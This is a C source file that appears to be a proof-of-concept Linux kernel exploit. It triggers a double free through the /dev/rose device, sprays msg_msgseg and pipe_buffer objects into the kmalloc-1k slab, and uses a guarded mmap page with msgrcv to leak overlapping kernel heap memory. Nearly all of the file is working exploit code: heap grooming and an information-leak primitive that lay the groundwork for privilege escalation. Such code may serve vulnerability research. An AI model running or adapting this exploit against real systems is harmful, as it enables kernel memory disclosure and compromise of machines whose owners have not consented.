#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: %s\n", path, line, msg);
  exit(1);
}

#define assert(x)                                                              \
  do {                                                                         \
    if (!(x)) {                                                                \
      __die(__FILE__, __LINE__, #x);                                           \
    }                                                                          \
  } while (0)

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: ", path, line);
  perror(msg);
  exit(1);
}

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

#define check_syscall(x)                                                       \
  ({                                                                           \
    typeof(x) __x = x;                                                         \
    if (__x == (typeof(x))-1)                                                  \
      die_errno(#x);                                                           \
    __x;                                                                       \
  })

static int show_slabinfo = 0;

static void do_show_slabinfo(const char *s) {
  if (show_slabinfo) {
    printf("%s:\n", s);
    system("grep ^kmalloc-1k /proc/slabinfo");
  }
}

#define DATALEN_MSG 0xfd0
#define DATALEN_SEG 0xff8
#define PAGE_SIZE 0x1000

#define PIPE_MAX_SIZE 1048576  /* sysctl fs.pipe-max-size */
#define MSG_COUNT 10
#define PIPE_COUNT 10

int main(void) {
  char pipe_buf[PAGE_SIZE] = {};
  char buf[DATALEN_MSG + 900]; /* kmalloc-1k */
  int pipes[PIPE_COUNT][2];
  int queues[MSG_COUNT];
  char *guarded_page;
  int rose_fds[2];
  ssize_t rcved;
  size_t i, j;
  char *p;

  do_show_slabinfo("Initial");

  for (i = 0; i < sizeof(rose_fds) / sizeof(rose_fds[0]); i++) {
    rose_fds[i] = check_syscall(open("/dev/rose", O_RDWR));
  }
  check_syscall(close(rose_fds[0]));

  /*
   * Spray msg_msgsegs. One of them will hopefully land on top of the freed
   * MAX_DATA_HEIGHT allocation.
   */
  memset(buf, 'A', sizeof(buf));
  for (i = 0; i < MSG_COUNT; i++) {
    queues[i] = check_syscall(msgget(IPC_PRIVATE, IPC_CREAT | 0600));
    ((struct msgbuf *)buf)->mtype = i + 1;
    check_syscall(msgsnd(queues[i], buf, sizeof(buf), 0));
  }
  do_show_slabinfo("After msgsnd()");

  /*
   * BUG: double free.
   * This will hopefully free one of the msg_msgsegs above.
   */
  check_syscall(close(rose_fds[1]));

  /*
   * Spray pipe_buffers.
   * One of them will hopefully land on top of a freed msg_msgseg.
   */
  for (i = 0; i < PIPE_COUNT; i++) {
    check_syscall(pipe(pipes[i]));
    check_syscall(write(pipes[i][1], pipe_buf, sizeof(pipe_buf)));
  }
  do_show_slabinfo("After pipe()");

  /*
   * Prepare a rw page followed by an inaccessible page in order to stop the
   * iteration in store_msg() before it hits seg->next, which overlaps with
   * page->flags, which we don't control.
   */
  guarded_page = check_syscall(mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
  check_syscall(mprotect(guarded_page + PAGE_SIZE, PAGE_SIZE, PROT_NONE));

  for (i = 0; i < MSG_COUNT; i++) {
    p = guarded_page - sizeof(buf) + 1;
    rcved = msgrcv(queues[i], p, sizeof(buf), 0, 0);
    assert(rcved == -1 && errno == EFAULT);
    printf("%zu: ", i);
    for (j = 0; j < sizeof(buf) - 1; j++) {
      if (p[j] != 'A')
        printf("[%zu] %02x\n", j, p[j] & 0xff);
    }
    printf("\n");
  }
  for (i = 0; i < PIPE_COUNT; i++) {
    close(pipes[i][0]);
    close(pipes[i][1]);
  }

  do_show_slabinfo("Final");
}